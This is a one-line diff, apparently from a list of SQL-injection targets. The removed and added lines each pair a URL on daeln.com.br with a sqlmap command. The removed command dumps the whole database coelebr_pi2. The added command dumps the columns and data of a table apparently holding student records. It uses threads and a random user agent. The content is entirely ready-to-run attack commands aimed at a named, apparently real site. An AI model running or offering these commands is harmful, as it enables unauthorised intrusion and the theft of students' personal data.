@@ -1,1 +1,1 @@
-https://www.daeln.com.br/disciplinasperiodo.php?p=1 (GET)  # sqlmap.py -u https://www.daeln.com.br/disciplinasperiodo.php?p=1 -D coelebr_pi2 --dump-all
+https://www.daeln.com.br/alunosperiodo.php?p=1 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.daeln.com.br/alunosperiodo.php?p=1 -D coelebr_coele -T alunosutfpr --columns --dump
